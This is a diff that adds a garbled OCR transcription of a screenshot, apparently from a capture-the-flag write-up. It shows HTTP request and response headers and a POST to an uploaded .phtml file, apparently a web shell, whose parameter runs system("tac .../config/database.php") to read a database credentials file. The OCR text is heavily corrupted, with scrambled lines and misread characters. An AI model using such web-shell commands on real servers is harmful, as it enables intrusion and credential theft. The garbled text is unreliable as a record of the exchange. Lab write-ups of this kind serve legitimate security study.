@@ -1,0 +1,36 @@
+# OCR: 955abbf43a795db3e09197e7970e0c48.webp
+# 来源: .\02-WriteUp\2025\955abbf43a795db3e09197e7970e0c48.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:32
+
+Host: 192.168.8.17
+User-Agent zill (X11;
+ccept: text/html, application/:
+ccept-Language: en-US,en;q=0.5|
+Accept-Encoding: gzip, deflate
+Content-Type: application/
+Upgrade-Insecure-Requests: 1|
+HrTp/1.1 202 ok
+server: nginx/1.1@.3 (Ubuntu)
+Date: Tue, @5 Jul 2022 16:25:17 GMT
+Transfer-Encoding: chunked
+Connection: keep-alive
+Content-Encoding: gzip
+"127.0.0.1',
+array (
+Linux aarch64; rv
+html+xm1, application/
+ww- form
+Content-Type: text/html; charsetzUTF-8
+POST /static/upload/other/28228786/1657837878691688.phtml HTTP/1. 1
+-urlencoded
+h4ck4fun=system%28%22tac+%2Fvar%2Fwww%2Fhtml%2F config%2Fdatabase Php%22
+pe 和 dbname
+:78.8) Gecko/26188161 Firefo
+ml;q=6.9,image/ebp, *
+/192.168.8.177:19881/static/upload/other/28228786/1657837878691686.phtml
+Cookie: 1g=cn; PbootSystem=6vr3ep18mkn1u87u2i9qpe5800; Hn
+229%
+3B}
+mysqli, sqlite, pdo_mysql,pdo_sqlite|
+_f6f37dc3416ca514857b78d8b158837e=1657836446; Hm_lpvt_f6f37dc3416ca514857b78deb158037e=165703|
